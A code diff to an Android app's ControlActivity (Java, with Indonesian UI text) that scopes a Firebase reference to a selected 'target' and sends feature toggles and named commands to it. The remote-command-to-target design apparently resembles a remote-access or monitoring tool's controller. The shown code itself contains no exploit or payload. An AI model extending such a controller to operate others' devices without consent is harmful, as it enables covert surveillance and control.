@@ -8,6 +8,7 @@ import android.widget.Button;
 import android.widget.GridLayout;
 import android.widget.Switch;
 import android.widget.TextView;
+import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import com.google.android.material.snackbar.Snackbar;
 import com.google.firebase.database.DatabaseReference;
@@ -18,6 +19,8 @@ public class ControlActivity extends AppCompatActivity {
     private DatabaseReference mDatabase;
     private GridLayout gridFitur;
     private Button btnBack;
+    private String targetId;
+    private String targetName;
     private Handler handler = new Handler();
 
     @Override
@@ -28,12 +31,19 @@ public class ControlActivity extends AppCompatActivity {
         gridFitur = findViewById(R.id.gridFitur);
         btnBack = findViewById(R.id.btnBack);
 
-        FirebaseDatabase database = FirebaseDatabase.getInstance();
-        mDatabase = database.getReference("target");
+        targetId = getIntent().getStringExtra("targetId");
+        targetName = getIntent().getStringExtra("targetName");
 
-        btnBack.setOnClickListener(v -> {
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        mDatabase = database.getReference("target").child(targetId);
+
+        btnBack.setOnClickListener(v -> finish());
+
+        if (targetId == null) {
+            Toast.makeText(this, "⚠️ Target tidak ditemukan", Toast.LENGTH_SHORT).show();
             finish();
-        });
+            return;
+        }
 
         setupGrid();
     }
@@ -73,8 +83,8 @@ public class ControlActivity extends AppCompatActivity {
                 sw.setOnCheckedChangeListener((buttonView, isChecked) -> {
                     status.setText(isChecked ? "ON" : "OFF");
                     status.setTextColor(isChecked ? 0xFF30D158 : 0xFFE56A8D);
-                    mDatabase.child("control").child(fiturNames[index].toLowerCase()).setValue(isChecked);
-                    showSnackbar("✅ Perintah berhasil dikirim");
+                    mDatabase.child(fiturNames[index].toLowerCase()).setValue(isChecked);
+                    showSnackbar("✅ " + fiturNames[index] + " " + (isChecked ? "ON" : "OFF"));
                 });
             } else {
                 sw.setVisibility(View.GONE);
@@ -98,7 +108,7 @@ public class ControlActivity extends AppCompatActivity {
         builder.setPositiveButton("Jalankan", (dialog, which) -> {
             showSnackbar("⏳ Mengirim perintah...");
             handler.postDelayed(() -> {
-                mDatabase.child("control").child("command").setValue(fiturName.toLowerCase());
+                mDatabase.child("command").setValue(fiturName.toLowerCase());
                 showSnackbar("✅ Perintah berhasil dikirim ke target");
             }, 1000);
         });
